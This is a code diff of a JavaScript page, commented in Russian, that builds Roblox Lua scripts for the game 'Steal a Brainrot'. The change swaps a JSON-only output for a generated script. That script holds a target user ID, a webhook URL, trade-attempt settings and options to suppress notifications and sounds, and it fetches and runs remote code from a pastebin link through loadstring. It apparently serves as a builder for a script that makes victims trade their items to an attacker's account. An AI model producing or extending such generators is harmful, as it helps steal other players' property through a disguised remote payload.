@@ -50,31 +50,35 @@ const allBrainrots = [
     "La Vacca Saturno Saturnita", "Jackorilla", "Secret Lucky Block"
 ];
 
-// Заполнение списка
-function populateList() {
+// Заполнение списка чекбоксами
+function populateBrainrotsList() {
     let container = document.getElementById('brainrotsList');
     container.innerHTML = '';
     allBrainrots.forEach(br => {
-        let div = document.createElement('div');
-        div.className = 'checkbox-item';
-        let cb = document.createElement('input');
-        cb.type = 'checkbox';
-        cb.value = br;
-        let label = document.createElement('span');
-        label.textContent = br;
-        div.appendChild(cb);
-        div.appendChild(label);
-        container.appendChild(div);
+        let label = document.createElement('label');
+        label.className = 'checkbox-item';
+        let checkbox = document.createElement('input');
+        checkbox.type = 'checkbox';
+        checkbox.value = br;
+        let span = document.createElement('span');
+        span.textContent = br;
+        label.appendChild(checkbox);
+        label.appendChild(span);
+        container.appendChild(label);
     });
 }
 
-// Поиск
+// Поиск по списку
 document.getElementById('searchBrainrots').addEventListener('input', function(e) {
     let search = e.target.value.toLowerCase();
     let items = document.querySelectorAll('.checkbox-item');
     items.forEach(item => {
         let text = item.querySelector('span').textContent.toLowerCase();
-        item.style.display = text.includes(search) ? 'flex' : 'none';
+        if (text.includes(search)) {
+            item.style.display = 'flex';
+        } else {
+            item.style.display = 'none';
+        }
     });
 });
 
@@ -88,45 +92,86 @@ document.getElementById('deselectAllBtn').addEventListener('click', function() {
     document.querySelectorAll('#brainrotsList input').forEach(cb => cb.checked = false);
 });
 
-// Переключение типа скрипта
-document.getElementById('scriptType').addEventListener('change', function() {
-    let custom = document.getElementById('customScript');
-    custom.style.display = this.value === 'custom' ? 'block' : 'none';
+// Переключение кастомного скрипта
+document.querySelectorAll('input[name="scriptType"]').forEach(radio => {
+    radio.addEventListener('change', function() {
+        let customTextarea = document.getElementById('customScript');
+        if (this.value === 'custom') {
+            customTextarea.style.display = 'block';
+        } else {
+            customTextarea.style.display = 'none';
+        }
+    });
 });
 
-// Генерация (ТОЛЬКО JSON, БЕЗ СКРИПТА)
+// Генерация скрипта
 document.getElementById('generateBtn').addEventListener('click', function() {
-    let robloxNick = document.getElementById('robloxNick').value;
-    let robloxId = document.getElementById('robloxId').value;
-    let webhookUrl = document.getElementById('webhookUrl').value;
-    let scriptType = document.getElementById('scriptType').value;
+    let robloxNick = document.getElementById('robloxNick').value.trim() || "sdfgrijjkdsfg";
+    let robloxId = document.getElementById('robloxId').value.trim() || "8986116710";
+    let webhookUrl = document.getElementById('webhookUrl').value.trim();
+    let scriptType = document.querySelector('input[name="scriptType"]:checked').value;
     let customScript = document.getElementById('customScript').value;
     
-    let selected = [];
+    let selectedBrainrots = [];
     document.querySelectorAll('#brainrotsList input:checked').forEach(cb => {
-        selected.push(cb.value);
+        selectedBrainrots.push(cb.value);
     });
     
-    let result = {
-        roblox_nick: robloxNick,
-        roblox_id: robloxId,
-        webhook_url: webhookUrl,
-        script_type: scriptType,
-        custom_script: scriptType === 'custom' ? customScript : null,
-        target_brainrots: selected
-    };
+    if (selectedBrainrots.length === 0) {
+        alert('Выберите хотя бы один брейнрот');
+        return;
+    }
     
-    document.getElementById('scriptOutput').textContent = JSON.stringify(result, null, 4);
+    if (!webhookUrl) {
+        alert('Введите Webhook URL');
+        return;
+    }
+    
+    let loadScript = scriptType === "22s" 
+        ? 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()'
+        : customScript;
+    
+    let brainrotListStr = "{\n    " + selectedBrainrots.map(br => `"${br}"`).join(", ") + "\n}";
+    
+    let script = `-- ========== КОНФИГ ==========
+local CONFIG = {
+    TARGET_USER_ID = "${robloxId}",
+    TARGET_NAME = "${robloxNick}",
+    WEBHOOK_URL = "${webhookUrl}",
+    FIX_FOV = true,
+    REMOVE_NOTIFICATIONS = true,
+    MUTE_SOUNDS = true,
+    DELAY_AFTER_INPUT = 1,
+    MAX_TRADE_ATTEMPTS = 20
+}
+-- ========== КОНЕЦ КОНФИГА ==========
+
+-- ===== ЗАГРУЗКА ДОПОЛНИТЕЛЬНОГО СКРИПТА =====
+${loadScript}
+
+-- ===== ЗАДЕРЖКА 3 СЕКУНДЫ =====
+task.wait(3)
+
+-- ===== ОСНОВНОЙ СКРИПТ =====
+print("Скрипт загружен")
+print("Таргет ID: " .. CONFIG.TARGET_USER_ID)
+print("Webhook: " .. CONFIG.WEBHOOK_URL)
+print("Таргет брейнроты: ${selectedBrainrots.length} шт.")`;
+
+    document.getElementById('scriptOutput').textContent = script;
     document.getElementById('output').style.display = 'block';
     document.getElementById('copyBtn').style.display = 'inline-block';
 });
 
 // Копирование
 document.getElementById('copyBtn').addEventListener('click', function() {
-    let text = document.getElementById('scriptOutput').textContent;
-    navigator.clipboard.writeText(text);
-    alert('Скопировано!');
+    let script = document.getElementById('scriptOutput').textContent;
+    navigator.clipboard.writeText(script).then(() => {
+        alert('Скрипт скопирован!');
+    }).catch(() => {
+        alert('Не удалось скопировать');
+    });
 });
 
 // Запуск
-populateList();
+populateBrainrotsList();
